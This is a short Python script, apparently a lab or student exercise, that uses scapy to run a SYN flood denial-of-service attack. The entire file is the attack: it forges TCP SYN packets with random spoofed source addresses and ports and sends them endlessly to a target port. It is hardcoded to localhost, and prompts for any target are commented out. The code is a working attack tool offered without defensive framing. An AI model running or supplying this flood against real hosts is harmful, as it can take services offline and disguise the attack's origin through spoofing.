import random, sys
from scapy.all import *

def sendPackets(target, port):
	print(f"\npid: {os.getpid()}")
	total = 0
	while 1:
		#creating packet
		# insert IP header fields
		#Forge the SYN packet -> IP layer
		i = IP()
		#set source IP as random valid IP
		#source ip address is randomly generated using the function -> random.randint
		i.src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
		# forge IP packet with target ip as the destination IP address
		i.dst = target

		# insert TCP header fields
		#destination ip address, is the server’s ip address
		t = TCP()
		#set source port as random valid port
		# the s port is in a range between 1 and 65535
		t.sport = random.randint(1,65535) #source port is randomly generated with this function
		#destination port, is the server’s listening port 
		t.dport = port
		#set SYN flag that means is a SYN segment
		# flag s = SYN packet
		t.flags = 'S'

		# stack up the layers
		# send the constructed packet in a loop until CTRL+C is detected 
		# the function send sends packets at layer 3 -> network layer
		# Viene assegnato un indirizzo IP univoco
		# setting verbose to 0 will not print anything during the process
		p = i/t
		send(p, verbose=0)
		total += 1
		sys.stdout.write(f"\rTotal packets sent: {total}")
		# print(f"packet sent by {os.getpid()}")


def main():
	total = 0
	target = "127.0.0.1" # str(input("Insert the target IP: "))
	port = 80 # int(input("Insert the port to be attacked: "))
	print (f"Flooding {target}:{port} with SYN packets.")

	sendPackets(target, port)


if __name__ == "__main__" :
	main()